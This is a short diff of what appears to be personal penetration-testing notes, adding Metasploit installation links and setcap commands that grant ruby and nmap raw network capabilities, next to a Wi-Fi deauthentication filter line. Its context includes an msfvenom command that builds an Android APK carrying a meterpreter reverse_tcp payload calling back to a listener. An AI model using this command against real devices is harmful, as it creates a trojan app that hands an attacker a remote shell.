@@ -14,10 +14,11 @@ wlan.fc.type_subtype == 12
 
 ### MSF 101  
 
+ -  https://snapcraft.io/metasploit-framework  
 snap connect metasploit-framework:network-control :network-control  
-(do the following or run msf with "sudo -i")
-/usr/sbin/setcap cap_net_raw,cap_net_bind_service=+eip $(which ruby)
-/usr/sbin/setcap cap_net_raw,cap_net_bind_service=+eip $(which nmap)
+ -  https://github.com/rapid7/metasploit-framework/issues/10721  
+/usr/sbin/setcap cap_net_raw,cap_net_bind_service=+eip $(which ruby)  
+/usr/sbin/setcap cap_net_raw,cap_net_bind_service=+eip $(which nmap)  
   
 msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.110.126 LPORT=4444 -o android_client.apk  
   
